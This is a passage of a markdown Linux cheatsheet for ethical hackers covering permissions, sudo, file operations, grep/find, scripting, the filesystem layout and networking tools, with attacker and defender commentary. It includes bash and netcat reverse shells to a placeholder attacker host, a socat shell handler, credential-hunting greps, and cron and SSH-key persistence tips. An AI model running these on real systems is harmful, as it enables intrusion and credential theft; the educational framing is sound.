# 🐧 Linux Command Line Cheatsheet for Ethical Hackers

> *Hello, friend. This is the API reference you wish came bundled with the OS.*

A reference for Linux fundamentals with each concept paired to the offensive and defensive security perspective. Know the system, know the holes.

**Mental model:** Linux is a multiplayer game server running 24/7. The kernel is the game engine, handling physics and tick rate. The filesystem is the persistent world state on disk. Processes are active player sessions. Users are accounts on the leaderboard. Permissions are the ACL on every zone, chest, and NPC. Root is the GM with `/noclip`, `/op`, and a kick button. Ethical hackers are the QA team the studio pays to break the game before the speedrunners do.

---

## 📑 Table of Contents

1. [Reading Files & Understanding Permissions](#1-reading-files--understanding-permissions)
2. [sudo vs su: Privilege Escalation 101](#2-sudo-vs-su-privilege-escalation-101)
3. [Creating, Moving, and Deleting Files](#3-creating-moving-and-deleting-files)
4. [Searching & Extracting Data from Files](#4-searching--extracting-data-from-files)
5. [Turning Commands into Scripts (and How the Shell Finds Them)](#5-turning-commands-into-scripts-and-how-the-shell-finds-them)
6. [Where Data Lives: The Filesystem Map](#6-where-data-lives-the-filesystem-map)
7. [Your Computer on the Network](#7-your-computer-on-the-network)
8. [Basic Security & Identifying User Types](#8-basic-security--identifying-user-types)
9. [Managing File Permissions & Ownership](#9-managing-file-permissions--ownership)
10. [Pen Testing Fundamentals: What Every Ethical Hacker Should Know](#10-pen-testing-fundamentals-what-every-ethical-hacker-should-know)
11. [Where to Learn This Stuff (Properly)](#11-where-to-learn-this-stuff-properly)
12. [Quick Reference Tables](#12-quick-reference-tables)

---

## 1. Reading Files & Understanding Permissions

Reading a file is dereferencing a pointer into the filesystem. Permissions decide whether your read returns data or a polite `EACCES` to the face.

### Reading file contents

| Command | What it does |
|---|---|
| `cat file.txt` | Dump the whole file. The `git show --no-pager` of the OS. |
| `tac file.txt` | Same, but bottom-up. Useful on logs when the newest line matters most. |
| `less file.txt` | Paginated, searchable (`/term`, `n`, `q` to quit). The default for anything bigger than a screen. |
| `more file.txt` | The Node 0.10 of pagers. Still works. No one uses it. |
| `head -n 20 file` | First 20 lines. `LIMIT 20` with default sort. |
| `tail -n 20 file` | Last 20 lines. `LIMIT 20 ORDER BY rowid DESC`. |
| `tail -f /var/log/syslog` | Stream new lines as they arrive. A Kafka consumer for the file. |
| `nl file.txt` | Print with line numbers prepended. |
| `wc -l file` | Line, word, byte count without fetching rows. |
| `cat -A file` | Show non-printable characters (tabs, line endings). The hidden-character X-ray. |
| `file mystery.bin` | Identify file type by magic bytes. The browser's `Content-Type` autodetect. |
| `strings binary` | Pull printable ASCII out of compiled binaries. `grep` on a stack trace for symbols. |
| `xxd file` | Hex view of bytes. The debugger's memory inspector, scoped to a file. |
| `hexdump -C file` | Same idea, slightly different formatting. Both are fine. |
| `od -c file` | Octal-and-character dump. Older but lives in scripts. |
| `base64 file` / `base64 -d` | Encode or decode base64. Half of every CTF challenge involves one of these. |
| `md5sum`, `sha256sum` | Hash a file. Verify downloads, fingerprint binaries. |

A real example you'll run on every box you land on:

```bash
cat /home/elliot/.bash_history    # what did the user actually type?
```

Bash history is the dev's REPL transcript. People paste passwords inline and never think about it again.

### Permission anatomy

```
-rwxr-xr--  1 alice  devs  4096 Oct 12 10:23 secret.sh
│└┬┘└┬┘└┬┘  │ └─┬─┘ └─┬─┘ └─┬┘  └────┬────┘ └──┬──┘
│ │  │  │   │   │     │    │        │         │
│ │  │  │   │   │     │    │        │         └── filename
│ │  │  │   │   │     │    │        └── modification time
│ │  │  │   │   │     │    └── size in bytes
│ │  │  │   │   │     └── group owner
│ │  │  │   │   └── user owner
│ │  │  │   └── hard link count
│ │  │  └── "others" perms
│ │  └── group perms
│ └── user (owner) perms
└── file type: `-` file, `d` dir, `l` symlink, `s` socket, `c` char dev, `b` block dev
```

Each `rwx` block is a 3-bit flag register. Read=4, write=2, execute=1. OR them together to get octal. So `rwxr-xr--` is 754, `rw-r--r--` is 644 (a normal file), `rwxr-xr-x` is 755 (a normal script).

Three RBAC roles (owner, group, other), each holding a bitmask, evaluated by every syscall that touches the file. That's it. That's the whole thing.

### Hidden files, dotfiles, and `ls`

Filenames starting with `.` are hidden from default `ls`. This isn't a security feature, it's a UI convention. Use `ls -a` (or `-la` for long form) to see them. Most of a Linux user's actual config lives in dotfiles in their home directory: `.bashrc`, `.profile`, `.ssh/`, `.config/`, `.gitconfig`, `.aws/credentials`, `.env`. If you've ever wondered why a fresh shell behaves differently from yours, the answer is in the dotfiles.

### 🎯 Hacker's-eye view

When an attacker lands on a box, reading is reconnaissance. Their priority queue:

- **World-readable secrets.** `/etc/passwd` is always readable. Backup files (`*.bak`, `*~`, `*.old`), `.env` files committed by mistake, config files in `/opt` and `/var/www`, SSH keys in home directories.
- **Logs for context.** `/var/log/auth.log`, `/var/log/apache2/access.log`, `/var/log/syslog`. These are the production logs of the OS itself, with user behavior, source IPs, and the occasional password fat-fingered into the username field.
- **History files.** `~/.bash_history`, `~/.mysql_history`, `~/.python_history`, `~/.lesshst`. The shell remembers everything unless someone configured it not to. Most people did not.
- **Hidden files.** `ls -la` in every home directory. `.aws/`, `.ssh/`, `.kube/`, `.docker/`, `.gnupg/`. Each one a credential store.

`chmod 600 ~/.ssh/id_rsa` is not optional. If you have hosts in scope, audit world-readable files in sensitive paths with `find / -type f -perm -o=r 2>/dev/null` and treat `.env` like a production secret. Because it is one.

---

## 2. sudo vs su: Privilege Escalation 101

`su` swaps your entire SecurityContext at the JVM level. New principal, new authorities, new everything until the shell exits. `sudo` is a single `@PreAuthorize("hasRole('ROOT')")` annotation on one method invocation, with every call getting a row in the audit log.

| | `su` | `sudo` |
|---|---|---|
| What it does | Switches to another user shell entirely | Runs a single command as another user |
| Default target | `root` | `root` (configurable per-command) |
| Password required | The **target** user's password | **Your own** password |
| Granular control | None, all-or-nothing | Per-command via `/etc/sudoers` |
| Auditability | Weak | Strong (`/var/log/auth.log`) |

```bash
su -                    # full login shell as root (need root's password)
su - elliot             # become user elliot, with their environment
sudo cmd                # run cmd as root
sudo -u tyrell cmd      # run cmd as tyrell
sudo -i                 # interactive root login shell
sudo -s                 # root shell, your environment
sudo -l                 # list what YOU are allowed to sudo
sudo -k                 # kill cached sudo credentials (force re-prompt)
sudo -E cmd             # preserve your environment vars when running cmd
sudo !!                 # rerun the previous command with sudo
```

The `sudoers` file lives at `/etc/sudoers` and you should never edit it with a regular editor. Use `visudo`, which validates syntax before saving, because a broken sudoers file means nobody on the box can become root and you've just bricked production.

```
# user host=(runas) commands
alice ALL=(ALL:ALL) ALL                    # alice is basically root
bob   ALL=(root) NOPASSWD: /usr/bin/apt    # bob can apt without a password
%devs ALL=(ALL) /usr/bin/systemctl restart nginx   # group rule
```

### 🎯 Hacker's-eye view

`sudo -l` is the first command an attacker runs after getting a shell. It's `aws iam list-attached-user-policies` for Linux, except the response is a printed checklist of every privesc path you've personally authorized for them.

The classic vulnerability patterns:

**`NOPASSWD` on a binary that can shell out.** Plenty of "innocent" tools (`vim`, `less`, `find`, `awk`, `python`, `tar`, `zip`, even `man`) have escape hatches. If you can run `sudo vim`, you do `:!bash` and you're root. The reference is [GTFOBins](https://gtfobins.github.io), which is essentially a CVE database for legitimate utilities turned weapon.

**`ALL=(ALL) ALL` over-permission.** The IAM equivalent of attaching `AdministratorAccess` to an intern.

**Wildcards in sudoers paths.** `sudo /usr/bin/cat /var/log/*` looks safe right up until the attacker creates `/var/log/../etc/shadow` and the glob expands its way through a privilege boundary.

**`su` to a service account.** If `apache` or `mysql` has a real shell and a weak password, attackers pivot the way you'd hop from a compromised microservice to the database it talks to.

The takeaway, defensively, is that every `sudo` rule is its own tiny attack surface. Audit them with `sudo -l -U username`. Treat the sudoers file the way you'd treat IAM policy in a security review: principle of least privilege, no exceptions for "just this one thing."

---

## 3. Creating, Moving, and Deleting Files

Filesystem operations are the CRUD of Linux. Hackers are the integration testers from the dark timeline, hammering every edge case the developer never tested. What if the path is a symlink racing toward `/etc/shadow`? What if the file gets swapped between the `stat()` and the `open()`? What if `umask` is 000 in production?

```bash
# Create
touch file.txt                  # empty file (or update timestamp on existing)
touch -t 202401151200 file      # set specific timestamp (timestomping anyone?)
mkdir newdir                    # one directory
mkdir -p path/to/nested/dir     # whole tree at once
mktemp                          # safely create a temp file with a random name
mktemp -d                       # safe temp directory
echo "hi" > file.txt            # write (overwrite)
echo "hi" >> file.txt           # append
printf "%s\n" "line1" "line2" > file.txt   # printf is more reliable than echo

# Copy
cp src.txt dst.txt              # single file
cp -r srcdir/ dstdir/           # recursive
cp -p file backup               # preserve perms and timestamps
cp -a srcdir/ dstdir/           # archive mode (perms, links, times, recursive)
install -m 755 src /usr/local/bin/  # cp + chmod + chown in one (used in install scripts)

# Move / rename (one command, no distinction)
mv old.txt new.txt
mv file.txt /tmp/

# Delete
rm file.txt                     # delete
rm -i file.txt                  # interactive (asks first)
rm -r dir/                      # recursive
rm -rf dir/                     # recursive + force. No confirmation. No undo.
rmdir emptydir/                 # only succeeds if empty
shred -uvz file.txt             # overwrite-then-unlink (anti-forensics)

# Links
ln target hardlink              # hard link: two pointers to the same heap object (same inode)
ln -s target symlink            # symbolic link: a pointer to a pointer (can dangle)
readlink -f symlink             # resolve to the actual final path
```

Two warnings worth burning into muscle memory.

There's no Recycle Bin. `rm -rf` is `DROP TABLE` with no transaction. `rm -rf $UNSET_VAR/*` becomes `rm -rf /*`, which is the OS-equivalent of a runaway Bash variable taking out a production database. Modern `rm` requires `--no-preserve-root` to nuke `/`, but the variable-expansion trap is still wide open. This has destroyed real servers.

`dd` deserves its own warning. It does block-level copies, used for disk imaging, ISO writing, and a thousand other things. It's also informally known as "disk destroyer" because typing the wrong device name (`of=/dev/sda` vs `of=/dev/sdb`) overwrites a live disk with no warning. Useful command, terrifying tool.

```bash
dd if=/dev/sda of=/mnt/backup/disk.img bs=4M status=progress
```

### 🎯 Hacker's-eye view

Where attackers like to write — the writable buckets of the filesystem:

- `/tmp` and `/var/tmp` are world-writable by default. Classic dropzones for staging exploits. Like an unauthenticated S3 bucket someone forgot about. Mounting `/tmp` with `noexec` breaks the easy version of this attack (still bypassable).
- `/dev/shm` is RAM-backed tmpfs. Also world-writable. Leaves no disk forensic trace after reboot. The Redis of malicious payloads.
- Writable cron paths. If `/etc/cron.d/` or any cron script is world-writable, dropping a file equals scheduled root execution.
- PATH-injectable directories. If a writable directory appears in `$PATH` *before* `/usr/bin`, an attacker can shadow `ls` or `sudo` with a trojan, the same way a malicious npm package can shadow a real one if your registry config is wrong.

The dot trick. Filenames starting with `.` hide from default `ls`, like fields prefixed with `_` in some style guides ("don't touch this"). Attackers like names like `...` (three dots), `..  ` (dot-dot-space), or innocuous mimics. `ls -la` and `find / -name "..*"` flush them out.

Anti-forensics matters because `rm` does not erase data. It frees the inode reference, the way `delete obj` in JavaScript only removes a property — the underlying memory still holds the value until something else overwrites it. `extundelete` and `photorec` recover "deleted" files. That's why `shred`, full-disk encryption (LUKS), and SSD TRIM exist.

The `chattr` command is worth knowing because it sets attributes the standard `chmod` model doesn't cover, including the "immutable" bit:

```bash
sudo chattr +i file.txt    # immutable: even root cannot modify or delete
sudo chattr -i file.txt    # remove immutable
lsattr file.txt            # show extended attributes
```

Attackers use `+i` for persistence (you can't trivially delete their backdoor), defenders use it to harden critical configs. If something refuses to delete and `rm` says "operation not permitted" while you're root, check `lsattr` first.

Symlink attacks (TOCTOU race conditions) are textbook. If a privileged process writes to `/tmp/output.log` without checking, an attacker symlinks `/tmp/output.log -> /etc/passwd` and the process clobbers the password file. Defense lives in the code (`O_NOFOLLOW`) and the kernel (`fs.protected_symlinks=1`).

---

## 4. Searching & Extracting Data from Files

`grep`, `find`, `awk`, `sed` are the SQL of the filesystem. `grep` is `WHERE content LIKE '%pattern%'`. `find` is `WHERE` against the metadata index. `awk` is `SELECT` with column projection and aggregation. `sed` is `UPDATE` streaming over rows. Pentesters live in these, full-time.

### `find`: locate files by attributes

```bash
find / -name "config.php" 2>/dev/null
find /home -type f -name "*.key"
find / -type f -size +100M               # bigger than 100MB
find / -mtime -1                         # modified in last 24h
find / -atime -1                         # accessed in last 24h
find . -name "*.log" -exec rm {} \;      # find + execute
find / -user elliot                      # files owned by elliot
find / -group sudo                       # files in the sudo group
find / -perm -4000 2>/dev/null           # SUID binaries
find / -perm -2000 2>/dev/null           # SGID binaries
find / -writable -type d 2>/dev/null     # writable directories
find / -nouser -o -nogroup 2>/dev/null   # orphaned files (deleted users)
```

### `locate`: instant file lookup via index

```bash
locate fsociety.dat              # query the database (very fast)
sudo updatedb                    # rebuild the database (often nightly via cron)
```

`locate` is `find` with an index. It's faster but stale by however long since the last `updatedb`.

### `which`, `whereis`, `type`, `command -v`: where does this binary live?

```bash
which python3                    # location of the executable in PATH
whereis python3                  # binary, source, manpage
type ls                          # is it a builtin? alias? function? file?
command -v ssh                   # POSIX-portable version of which
```

If you've ever wondered "wait, why did running `ls` produce colored output here but not there," the answer is `type ls` and you'll find someone aliased it.

### `grep`: pattern search inside files

```bash
grep "password" config.php
grep -i "pass" file.txt                  # case-insensitive
grep -r "TODO" src/                      # recursive
grep -rn "TODO" src/                     # plus line numbers
grep -v "INFO" log.txt                   # invert (everything except)
grep -E "user[0-9]+" file                # extended regex
grep -P "\d{3}-\d{2}-\d{4}" file         # Perl-compatible regex (PCRE)
grep -A 3 -B 2 "ERROR" log.txt           # context (3 after, 2 before)
grep -C 5 "ERROR" log.txt                # context (5 both sides)
grep -l "secret" *.txt                   # just list filenames that match
grep -c "404" access.log                 # count matches
grep --include="*.php" -r "eval(" /var/www/   # restrict by filename
```

If `grep` feels slow on a big tree, install `ripgrep` (`rg`) or `the_silver_searcher` (`ag`). They respect `.gitignore` by default and are absurdly fast.

### `awk`: column processor and mini-language

```bash
awk '{print $1}' access.log              # first whitespace column
awk -F: '{print $1}' /etc/passwd         # split by colon
awk '$3 > 1000 {print $1}' /etc/passwd   # filter then project
awk '/ERROR/ {count++} END {print count}' log.txt   # count matches
awk -F: 'NR>1 {sum+=$2} END {print sum}' data.csv   # skip header, sum
```

`awk` is essentially a streaming MapReduce one-liner. Per-line lambda, optional `END {}` reducer, fields auto-split into `$1..$N`. If you've used Spark or Pandas, the model maps directly.

### `sed`: stream editor

```bash
sed 's/old/new/g' file.txt               # global replace
sed -i 's/old/new/g' file.txt            # in-place edit (DANGEROUS without backup)
sed -i.bak 's/old/new/g' file.txt        # in-place with .bak backup
sed -n '10,20p' file.txt                 # print lines 10-20
sed '/^#/d' config.conf                  # delete comment lines
sed '/^$/d' file                         # delete blank lines
```

### Pipeline glue

```bash
cut -d: -f1 /etc/passwd                  # first colon-delimited field
cut -c1-10 file                          # first 10 characters of each line
sort | uniq -c | sort -rn                # GROUP BY + COUNT + ORDER BY DESC
sort -u file                             # unique sort (combines two steps)
tr 'a-z' 'A-Z'                           # translate chars
tr -d '\r' < file > clean                # delete carriage returns (Windows-to-Unix)
xargs                                    # turn stdin into command args
xargs -I {} cmd {}                       # placeholder substitution
xargs -P 4 -I {} cmd {}                  # parallel execution (4 at a time)
tee file                                 # split output to file AND stdout
tee -a file                              # append instead of overwrite
comm file1 file2                         # compare sorted files (3-column diff)
diff file1 file2                         # line-by-line diff
cmp file1 file2                          # byte-by-byte comparison
paste file1 file2                        # join files side by side, by line
```

### 🎯 Hacker's-eye view

This whole section is the enumeration phase of a pentest, expressed as filesystem queries.

The privesc one-liner everyone learns:

```bash
find / -perm -4000 -type f 2>/dev/null
```

This finds all SUID binaries — files that run with the file owner's privileges no matter who executes them. Think of SUID as `@RunAs(root)` on a binary's `main()`. If `/usr/bin/passwd` is SUID root, that's expected (it has to write to `/etc/shadow`). If `/home/elliot/notes` is SUID root, someone shipped a debug annotation to production, and an attacker just got root.

Credential hunting greps:

```bash
grep -r -iE "password|passwd|api[_-]?key|secret|token" /var/www/ 2>/dev/null
grep -rIE "BEGIN (RSA|OPENSSH|EC) PRIVATE KEY" / 2>/dev/null
find / \( -name "*.bak" -o -name "*~" -o -name "*.old" -o -name ".env" \) 2>/dev/null
```

Log analysis from the defender side, same tools, different goal:

```bash
# Top 10 IPs hitting the web server
awk '{print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -rn | head

# Failed SSH login attempts grouped by source IP
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn

# Sudo invocations in the last hour
grep "sudo:" /var/log/auth.log | tail -100
```

Same query language finds the vulnerability and detects the intrusion. The asymmetry: defenders need to find every anomaly, attackers only need one true-positive hit.

---

## 5. Turning Commands into Scripts (and How the Shell Finds Them)

A script is a user-defined function in your shell's runtime. The shebang is the type signature, telling the kernel which interpreter to dispatch to. `chmod +x` is marking the function `public`.

Before scripts, though, the dot operator. People skip this and then everything else gets confusing.

### How the shell resolves what to run

When you type a command, the shell does roughly this:

1. Check if it's a shell builtin (`cd`, `echo`, `export`, `source`).
2. Check if it's an alias.
3. Check if it's a function defined in the current shell.
4. Search each directory in `$PATH` in order, return the first match.

If none of those hit, you get `command not found`. Try it: `echo $PATH` shows the search list, colon-separated. `which ls` tells you which one won.

### The dot operator and the slash

```bash
./script.sh           # run script.sh from the current directory
../script.sh          # run script.sh from the parent directory
~/bin/script.sh       # run script.sh from your home directory's bin/
/full/path/script.sh  # absolute path

. script.sh           # source the script (run inside the current shell)
source script.sh      # same thing, more readable
```

The `./` prefix is mandatory when running a script from the current directory because, by default, `.` (the current directory) is not in `$PATH`. This is intentional and security-relevant. If `.` were in your PATH, an attacker who got you to `cd` into `/tmp` could plant a malicious `ls` that runs the moment you typed it. Linux makes you opt in.

Sourcing (`.` or `source`) is fundamentally different from executing:

- **Executing** (`./script.sh`) spawns a child process. Variables set inside it don't survive after it exits.
- **Sourcing** (`. script.sh`) runs the file in your current shell. Variables, functions, and `cd` calls all persist.

This is why `~/.bashrc` is sourced, not executed. Your shell's environment needs to actually change.

```bash
echo $MY_VAR              # (empty)
./set-var.sh              # sets MY_VAR inside, exits
echo $MY_VAR              # still empty (child process)

. ./set-var.sh            # sources it
echo $MY_VAR              # now set
```

The dot also shows up in three other places:

- `.` alone means "current directory" (`cd .` is a no-op, `cp file .` copies into here).
- `..` means "parent directory" (`cd ..`).
- Filenames starting with `.` are hidden from default `ls`. The dotfiles convention.

### The minimum viable script

```bash
#!/bin/bash
# stage1.sh - simple example
# (yes, that's a Mr. Robot reference)

set -euo pipefail   # fail fast: error, unset vars, pipe failures

NAME="${1:-friend}"
echo "Hello, $NAME"
```

```bash
chmod +x stage1.sh
./stage1.sh elliot
```

`#!/bin/bash` is the shebang: a one-line dispatch table that tells the kernel which runtime to spawn. `#!/usr/bin/env python3` for Python, `#!/usr/bin/env node` for Node. The `env` form is the cross-platform polyfill, since not every system has Python at `/usr/bin/python3`.

### Variables, conditionals, loops, functions

```bash
# Variables (no spaces around =)
greeting="hello"
echo "$greeting world"          # double quotes interpolate
echo '$greeting world'          # single quotes are literal
echo "${greeting}_suffix"       # braces disambiguate where the var name ends

# Default values and parameter expansion
name="${1:-anonymous}"          # use $1 or "anonymous" if unset
upper="${name^^}"               # uppercase
length="${#name}"               # string length

# Command substitution
files=$(ls /tmp)
today=$(date +%F)

# Arithmetic
count=$((1 + 2))
((count++))

# Conditionals
if [[ -f "/etc/passwd" ]]; then
  echo "exists"
elif [[ -d "/tmp" ]]; then
  echo "dir"
else
  echo "neither"
fi

# Test operators worth knowing:
# -f file exists, -d dir exists, -e any exists
# -r readable, -w writable, -x executable
# -z empty string, -n nonempty
# == != =~ (regex match)
# numeric: -eq -ne -lt -le -gt -ge

# Loops
for f in *.log; do
  echo "Processing $f"
done

for i in {1..10}; do echo $i; done
for i in $(seq 1 10); do echo $i; done

while read -r line; do
  echo "Got: $line"
done < input.txt

until [[ -f /tmp/done ]]; do
  sleep 1
done

# Case (the switch statement)
case "$1" in
  start) echo "starting" ;;
  stop)  echo "stopping" ;;
  *)     echo "unknown" ;;
esac

# Functions
greet() {
  local name="$1"
  echo "Hi, $name"
  return 0
}
greet "Brittney"
```

### Job control: running things in the background

```bash
long-running-cmd &              # run in background
jobs                            # list backgrounded jobs in this shell
fg %1                           # bring job 1 to foreground
bg %1                           # send job 1 back to background
kill %1                         # kill job 1
nohup cmd &                     # immune to hangup signal (survives terminal close)
disown -h %1                    # detach from shell so cmd survives terminal close
Ctrl+Z                          # suspend the current foreground job
Ctrl+C                          # SIGINT (interrupt)
```

### History, aliases, the niceties

```bash
history                         # your command history
!!                              # rerun the last command
sudo !!                         # rerun with sudo (every sysadmin's reflex)
!$                              # last argument of the previous command
!42                             # rerun command number 42
Ctrl+R                          # interactive reverse search

alias ll='ls -la'               # define alias
unalias ll                      # remove alias
alias                           # list current aliases

export VAR=value                # export to child processes
unset VAR                       # remove a variable
env                             # current environment
```

### Cron: scheduled scripts

```bash
crontab -e          # edit your crontab
crontab -l          # list
crontab -r          # remove (be careful)

# Format: minute hour day month weekday command
0 3 * * * /home/alice/backup.sh    # every day at 3am
*/5 * * * * /opt/health-check.sh   # every 5 minutes
@reboot /home/alice/startup.sh     # at boot
```

System-wide jobs live in `/etc/cron.d/`, `/etc/cron.daily/`, `/etc/cron.hourly/`, and `/etc/crontab`. Cron is the OS's built-in scheduler, except every job runs in production and most run as root.

`systemd timers` are the modern alternative. More flexible, harder to read.

### 🎯 Hacker's-eye view

Cron is one of the cleanest persistence mechanisms there is. The OS-level equivalent of a malicious GitHub Action that re-installs itself on every push. Common attacker moves:

- Drop a script in `/etc/cron.daily/` that re-establishes a reverse shell.
- Modify the user's crontab if they have one.
- Hide in `/etc/cron.d/` with a filename like `0logrotate-helper`.

Reverse shell scripting, the canonical "got remote code execution, now what":

```bash
# Bash reverse shell
bash -i >& /dev/tcp/attacker.ip/4444 0>&1

# Same thing with netcat
nc attacker.ip 4444 -e /bin/bash

# Listener on the attacker side
nc -lvnp 4444
```

`/dev/tcp` is a bash builtin, not a real file. It opens a TCP socket. Defender response: outbound firewall rules, EDR detecting `bash -i` patterns, monitoring `/dev/tcp` references, alerting on unusual outbound connections from server processes.

Shell injection vulnerabilities. When a script does `eval "$user_input"` or `bash -c "$untrusted"`, you've handed over the keys, the same way a SQL `executeRaw(userInput)` is a prepared-statement violation that turns into RCE. Defense pattern is `set -u`, proper quoting (`"$var"` not `$var`), and `--` to terminate option parsing.

Why `set -euo pipefail` matters. Without it, scripts march on after errors. It's the difference between a try/catch that handles failures and a process that swallows exceptions and returns 0. A backup script that silently fails to back up but keeps running rotation logic equals data loss. For security scripts, partial execution leaves systems in exploitable half-states.

---

## 6. Where Data Lives: The Filesystem Map

The Filesystem Hierarchy Standard (FHS) is the directory structure of a well-organized monorepo. Once you internalize that `/etc` is `config/`, `/var/log` is `logs/`, `/home` is `users/`, and `/usr/bin` is `node_modules/.bin/`, every Linux box looks like the same project with different env vars.

```
/                  ← root of everything (not the user "root")
├── bin/           Essential user binaries (ls, cat, cp). On modern systems, often → /usr/bin
├── boot/          Kernel, initramfs, bootloader configs
├── dev/           Device files (everything-is-a-file: /dev/sda, /dev/null, /dev/random)
├── etc/           System-wide configuration. The "settings panel."
│   ├── passwd     User accounts (world-readable)
│   ├── shadow     Hashed passwords (root-only, mode 000 or 600)
│   ├── group      Group definitions
│   ├── sudoers    Who can sudo what
│   ├── ssh/       SSH server configs and host keys
│   ├── systemd/   Service definitions
│   └── cron.d/    Scheduled jobs
├── home/          Per-user homes (~)
│   └── elliot/
│       ├── .ssh/         id_rsa, id_rsa.pub, authorized_keys, known_hosts
│       ├── .bash_history Shell history
│       ├── .bashrc       Shell config
│       ├── .config/      Per-user app config (XDG standard)
│       ├── .local/       Per-user binaries and data
│       ├── .gnupg/       GPG keys
│       └── .aws/, .kube/, .docker/    Cloud and container creds
├── lib/, lib64/   Shared libraries (.so files). The OS's node_modules.
├── media/, mnt/   Mount points for removable/temporary devices
├── opt/           Optional/third-party software ("opting in" extras)
├── proc/          Virtual FS: live kernel and process state, exposed as files
│   ├── cpuinfo    CPU details
│   ├── meminfo    RAM details
│   ├── [pid]/     Per-process info: cmdline, environ, fd/, maps, status
│   └── version    Kernel version
├── root/          The root user's home (NOT the / filesystem root, easy to confuse)
├── run/           Runtime data (PIDs, sockets), tmpfs since boot
├── sbin/          System binaries (admin tools)
├── srv/           Data served by the system (web, ftp roots, by convention)
├── sys/           Virtual FS for kernel/device interaction (sysfs)
├── tmp/           Temporary, world-writable, sometimes wiped at boot
├── usr/           "User" hierarchy. Most installed software actually lives here.
│   ├── bin/       Most binaries
│   ├── lib/       Libraries
│   ├── local/     Stuff installed by the sysadmin (not the package manager)
│   ├── sbin/      System admin binaries
│   └── share/     Architecture-independent data, docs, man pages
└── var/           Variable data (logs, mail, spool, caches)
    ├── log/       /var/log/auth.log, syslog, apache, etc.
    ├── www/       Common web root
    ├── mail/      User mail spools
    └── lib/       App state (databases, package state, etc.)
```

### Path manipulation commands

```bash
pwd                              # print working directory
cd /path                         # change to absolute path
cd ..                            # parent directory
cd -                             # previous directory (toggles back and forth)
cd                               # home (same as cd ~)
pushd /tmp                       # cd, but push current dir on a stack
popd                             # pop the stack and cd back
dirs -v                          # show the dir stack

realpath file                    # resolve to absolute canonical path
readlink -f symlink              # resolve symlinks fully
basename /a/b/c.txt              # → c.txt
dirname /a/b/c.txt               # → /a/b
```

### Inspection commands

```bash
df -h               # disk usage by mount point (human-readable)
df -i               # inode usage (running out of inodes is its own pain)
du -sh /var/log/*   # size per item, summarized, human-readable
du -ah /tmp | sort -h | tail    # biggest files in /tmp
mount               # what's mounted where
findmnt             # nicer mount output
lsblk               # block device tree
blkid               # block device UUIDs
stat file.txt       # detailed metadata: atime, mtime, ctime, inode, size, perms
file file.txt       # file type by content
```

### 🎯 Hacker's-eye view

This map is the loot table, indexed for fast lookup. After landing on a box, attackers run a mental priority queue:

| Path | Why it matters |
|---|---|
| `/etc/passwd` | User enumeration. Always readable. |
| `/etc/shadow` | Password hashes. Needs root to read, but if you can, hashcat awaits. |
| `/etc/sudoers`, `/etc/sudoers.d/` | The IAM policy file. |
| `/etc/ssh/sshd_config` | Is root login allowed? Are passwords enabled? Which auth methods? |
| `/etc/crontab`, `/etc/cron.d/` | Privileged scheduled jobs to hijack. |
| `~/.ssh/id_rsa` | Private SSH keys. Lateral movement starts here. |
| `~/.ssh/authorized_keys` | Append your public key, you have permanent access. |
| `~/.bash_history` | The dev's REPL transcript, including pasted passwords. |
| `~/.aws/credentials` | AWS access keys. Cloud pivot. |
| `~/.docker/config.json` | Registry tokens. |
| `~/.kube/config` | Kubernetes admin contexts. Often goes straight to cluster-admin. |
| `/var/log/*` | Forensic gold (defenders), evidence to wipe (attackers). |
| `/var/www/` | Web app source. `.env` and `wp-config.php` are credential goldmines. |
| `/proc/[pid]/environ` | Environment variables of running processes. Sometimes hold secrets. |
| `/proc/[pid]/cmdline` | Full command line. Passwords passed as args leak here. |
| `/dev/shm/` | Stealthy in-memory dropzone. |
| `/tmp/` | Same, but disk-backed. The Coney Island of payload staging. |
| `/opt/` | Custom enterprise apps. Often the most poorly hardened. |

`/proc` is wild. It's a memory-mapped API into the running kernel, exposed as a synthetic filesystem. Every process gets a directory. `cat /proc/$$/environ` shows your shell's environment. It's `process.env`, but for every process on the box, readable from a shell. Attackers love it for snooping on other users' processes (mitigated by `hidepid=2` mount option).

Defender rule of thumb: if it's in `/etc` and contains secrets, it should be `chmod 600` and owned by `root`, the same way a secret in your codebase should be in a vault and not committed. If it's in `/var/log`, it should be append-only where possible and shipped off-host. Attackers will edit logs the way a careless contractor force-pushes over a clean history.

---

## 7. Your Computer on the Network

A networked computer is a microservice in the wild. Every open port is a route on its public API. Every listening service is a request handler waiting to be hit. Every firewall rule is the API gateway deciding which calls get forwarded and which get a 403.

### Inspection

```bash
# Interfaces and addresses
ip a                        # modern (replaces ifconfig)
ip -br a                    # brief one-line-per-interface
ip route                    # routing table
ip route get 8.8.8.8        # which interface goes where
ifconfig                    # legacy, still common
hostname                    # this machine's name
hostname -I                 # all IP addresses

# Listening sockets and active connections
ss -tulnp                   # TCP, UDP, listening, numeric, processes
ss -tnp                     # active TCP connections
netstat -tulnp              # legacy equivalent
lsof -i                     # all internet sockets, with owning processes
lsof -i :80                 # who has port 80 open
lsof -nP -iTCP -sTCP:LISTEN # all TCP listeners

# DNS
dig example.com             # full DNS query (the modern default)
dig example.com MX
dig +short example.com      # just the answer
dig @8.8.8.8 example.com    # query a specific resolver
nslookup example.com        # simpler, older
host example.com            # the friendly version
whois example.com           # registration info
```

### Reachability and tracing

```bash
ping 8.8.8.8                # ICMP echo
ping -c 4 host              # bounded
traceroute host             # path to host
mtr host                    # ping + traceroute combined, live
```

### Fetching, pushing, sniffing

```bash
# HTTP
curl https://example.com                     # GET, output to stdout
curl -I https://example.com                  # headers only (HEAD)
curl -sL example.com -o page.html            # silent, follow redirects, save
curl -X POST -d "k=v" example.com/api        # POST form data
curl -H "Authorization: Bearer $TOKEN" url   # custom header
curl -k https://self-signed.local            # skip TLS verification (testing only)
curl -v https://example.com                  # verbose, see the whole exchange
wget https://example.com/file.tar.gz         # download

# Netcat: the Swiss army knife of TCP/UDP
nc -lvnp 4444                                # listen on port 4444 (reverse shell catcher)
nc target 22                                 # connect, see banner (banner grab)
nc -zv target 1-1000                         # port scan range (zero-I/O mode)
nc target 8080 < file                        # send file over TCP
nc -lvnp 9000 > received                     # receive file

# socat: more powerful than nc, harder to learn
socat TCP-LISTEN:4444,fork EXEC:/bin/bash    # better reverse shell handler

# Packet capture
sudo tcpdump -i eth0                         # capture on eth0
sudo tcpdump -i any port 80                  # only port 80
sudo tcpdump -w out.pcap                     # write to file (open in Wireshark)
sudo tcpdump -r out.pcap                     # read a pcap

# TLS inspection
openssl s_client -connect example.com:443    # see the cert chain
openssl s_client -connect example.com:443 -showcerts
